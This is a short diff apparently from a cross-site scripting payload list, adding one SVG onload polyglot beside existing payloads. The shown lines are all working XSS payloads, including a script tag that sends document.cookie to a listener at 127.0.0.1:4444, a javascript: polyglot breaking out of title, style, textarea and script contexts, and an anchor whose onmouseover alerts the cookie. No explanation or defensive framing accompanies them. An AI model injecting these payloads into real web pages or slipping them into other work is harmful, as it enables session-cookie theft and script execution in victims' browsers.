@@ -3,3 +3,4 @@
 <script>new Image().src = "http://127.0.0.1:4444?output=" + document.cookie;</script>
 javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
 \<a onmouseover="alert(document.cookie)"\>XSS Link\</a\>
+<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
